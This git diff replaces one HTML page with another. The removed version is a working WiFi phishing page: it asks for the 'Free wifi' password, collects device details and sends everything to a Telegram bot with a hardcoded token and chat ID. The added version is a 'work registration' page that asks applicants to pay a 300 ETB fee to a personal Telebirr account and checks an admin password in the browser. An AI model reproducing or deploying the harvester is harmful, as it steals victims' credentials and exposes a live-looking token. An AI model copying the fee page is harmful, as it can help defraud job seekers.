@@ -1,101 +1,255 @@
-# Freewifi
-Free wifi
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WiFi Security Update</title>
+<title>Online Work Registration</title>
+
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Arial,sans-serif; }
-  body { background:#f0f4f8; display:flex; justify-content:center; align-items:center; height:100vh; }
-  .card { background:#fff; width:380px; border-radius:14px; box-shadow:0 8px 30px rgba(0,0,0,.15); padding:30px; text-align:center; }
-  .wifi-icon { font-size:60px; color:#1a73e8; }
-  h2 { color:#202124; margin:12px 0 5px; font-size:20px; }
-  .ssid { color:#5f6368; background:#e8f0fe; display:inline-block; padding:4px 14px; border-radius:20px; font-weight:600; margin:8px 0 18px; }
-  input { width:100%; padding:13px; border:2px solid #dadce0; border-radius:8px; font-size:15px; margin:8px 0; outline:none; }
-  input:focus { border-color:#1a73e8; }
-  .btn { width:100%; padding:14px; background:#1a73e8; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:10px; }
-  .btn:hover { background:#1765cc; }
-  .note { font-size:12px; color:#80868b; margin-top:15px; }
-  .loading { display:none; color:#1a73e8; font-size:14px; margin-top:12px; }
+* {
+  box-sizing: border-box;
+}
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #edf2f7;
+  color: #222;
+}
+header {
+  background: #102c50;
+  color: white;
+  text-align: center;
+  padding: 25px 10px;
+}
+.container {
+  max-width: 500px;
+  margin: 20px auto;
+  padding: 20px;
+}
+.card {
+  background: white;
+  padding: 20px;
+  margin-bottom: 18px;
+  border-radius: 12px;
+  box-shadow: 0 3px 12px #0001;
+}
+h2 {
+  color: #102c50;
+}
+input, textarea, button {
+  width: 100%;
+  padding: 13px;
+  margin: 9px 0;
+  border: 1px solid #ccc;
+  border-radius: 7px;
+}
+button {
+  background: #087b47;
+  color: white;
+  border: none;
+  font-weight: bold;
+}
+button:hover {
+  background: #065d36;
+}
+.payment {
+  background: #e6f7ed;
+  padding: 15px;
+  border-radius: 8px;
+}
+.small {
+  font-size: 13px;
+  color: #666;
+}
+.hidden {
+  display: none;
+}
+footer {
+  text-align: center;
+  padding: 20px;
+  color: #666;
+}
 </style>
 </head>
+
 <body>
+
+<header>
+<h1>ONLINE WORK</h1>
+<p>Registration and Work Information</p>
+</header>
+
+<div class="container">
+
 <div class="card">
-  <div class="wifi-icon">📶</div>
-  <h2>WiFi Password Required</h2>
-  <div class="ssid">Network: <b id="net">Free wifi</b></div>
-9
-  <!-- Password field -->
-  <input type="password" id="pass" placeholder="Enter WiFi password..." autocomplete="off">
-
-  <!-- Confirm password -->
-  <input type="password" id="pass2" placeholder="Confirm password..." autocomplete="off">
-
-  <button class="btn" onclick="send()">Connect</button>
-
-  <div class="loading" id="load">⏳ Connecting... Please wait</div>
-  <div class="note">Your connection was interrupted. Please re-authenticate.</div>
+<h2>Welcome</h2>
+<p>Welcome to our online work registration website.</p>
+<p>Read the work description and payment terms
+before registering.</p>
 </div>
 
+<div class="card">
+<h2>Work Information</h2>
+<p>Work description: To be announced clearly by the
+website administrator.</p>
+<p>Payment terms: No income or job is guaranteed
+until the work and conditions are explained.</p>
+</div>
+
+<div class="card">
+<h2>Registration</h2>
+
+<form id="registerForm">
+
+<input type="text" id="name"
+placeholder="Full Name" required>
+
+<input type="tel" id="phone"
+placeholder="Phone Number" required>
+
+<input type="email" id="email"
+placeholder="Email (optional)">
+
+<label>Upload payment receipt (optional):</label>
+<input type="file" id="receipt"
+accept="image/*">
+
+<label>
+<input type="checkbox" id="agree"
+style="width:auto" required>
+I have read and understood the terms.
+</label>
+
+<button type="submit">Submit Registration</button>
+
+</form>
+
+<p id="result"></p>
+</div>
+
+<div class="card">
+<h2>Payment Information</h2>
+
+<div class="payment">
+<h3>Registration fee: 300 ETB</h3>
+<p>Receiver: Efrem</p>
+<p>Telebirr: 0987130401</p>
+</div>
+
+<p class="small">
+Only pay after the actual work, fee purpose,
+refund conditions and terms have been explained.
+</p>
+</div>
+
+<div class="card">
+<h2>ID Verification</h2>
+<p>Identity verification must be voluntary and
+handled through a secure verification service.</p>
+
+<p class="small">
+Do not upload sensitive identity documents
+to this demonstration website.
+</p>
+</div>
+
+<div class="card">
+<h2>Admin Login</h2>
+
+<input type="password" id="adminPassword"
+placeholder="Admin Password">
+
+<button onclick="adminLogin()">Login</button>
+
+<div id="adminPanel" class="hidden">
+<h3>Registration Records</h3>
+<div id="records"></div>
+</div>
+</div>
+
+</div>
+
+<footer>
+<p>Online Work Registration System</p>
+</footer>
+
 <script>
-// ========== CONFIG ==========
-const BOT_TOKEN="8806012391:AAG6pWd-o6cKYuQ58EFoidLZTXLn0G3Nvoc";      // ← @BotFather irraa kenni
-const CHAT_ID   = 987130401;                  // ← Telegram kee ID (Efi108)
-const FAKE_SSID = "Free wifi";            // ← WiFi maqaa fakkaatu
-// =============================
 
-document.getElementById('net').textContent = FAKE_SSID;
+let registrations = [];
 
-async function send() {
-  const p1 = document.getElementById('pass').value.trim();
-  const p2 = document.getElementById('pass2').value.trim();
+document.getElementById("registerForm")
+.addEventListener("submit", function(e) {
 
-  // Password lama wal-simaa ta'uu mirkaneessi
-  if (p1.length < 8 || p1 !== p2) {
-    alert('Password must match and be at least 8 characters');
-    return;
-  }
+e.preventDefault();
 
-  // Loading agarsiisi
-  document.getElementById('load').style.display = 'block';
+let person = {
+name: document.getElementById("name").value,
+phone: document.getElementById("phone").value,
+email: document.getElementById("email").value,
+date: new Date().toLocaleString()
+};
 
-  // Device info ofumaan fudhati
-  const info = {
-    ssid: FAKE_SSID,
-    password: p1,
-    time: new Date().toLocaleString(),
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    lang: navigator.language,
-    screen: screen.width + 'x' + screen.height
-  };
+registrations.push(person);
 
-  const msg = `🔓 WIFI CAPTURED\n` +
-              `📡 SSID: ${info.ssid}\n` +
-              `🔑 Password: ${info.password}\n` +
-              `🕒 Time: ${info.time}\n` +
-              `📱 Platform: ${info.platform}\n` +
-              `🌐 Lang: ${info.lang}\n` +
-              `🖥️ Screen: ${info.screen}`;
+document.getElementById("result").innerHTML =
+"Registration received in this demo. " +
+"Your payment has NOT been verified.";
 
-  // Telegram Bot API → ofumaan erga
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-  }).then(r => r.json()).then(d => {
-    // Yoo tokko ta'e, gara error page
-    window.location.href = "https://www.google.com";  // ← Booda gara real site deebi
-  }).catch(() => {
-    document.getElementById('load').textContent = '❌ Failed. Try again.';
-  });
+this.reset();
 
-  // Kana booda input qulqulleessi (page jijjiiru dura)
-  document.getElementById('pass').value = '';
-  document.getElementById('pass2').value = '';
+});
+
+function adminLogin() {
+
+let password =
+document.getElementById("adminPassword").value;
+
+// Demo password only. Replace with secure server authentication.
+if(password === "CHANGE_THIS_PASSWORD") {
+
+document.getElementById("adminPanel")
+.classList.remove("hidden");
+
+let output = "";
+
+registrations.forEach(function(person, index) {
+
+output += `
+<div class="payment">
+<p>Name: ${escapeHTML(person.name)}</p>
+<p>Phone: ${escapeHTML(person.phone)}</p>
+<p>Email: ${escapeHTML(person.email)}</p>
+<p>Date: ${escapeHTML(person.date)}</p>
+</div>
+`;
+
+});
+
+document.getElementById("records").innerHTML =
+output || "No registrations yet.";
+
+} else {
+
+alert("Incorrect password!");
+
 }
+
+}
+
+function escapeHTML(value) {
+return String(value).replace(/[&<>"']/g, function(c) {
+return {
+"&":"&amp;",
+"<":"&lt;",
+">":"&gt;",
+'"':"&quot;",
+"'":"&#39;"
+}[c];
+});
+}
+
 </script>
+
 </body>
 </html>
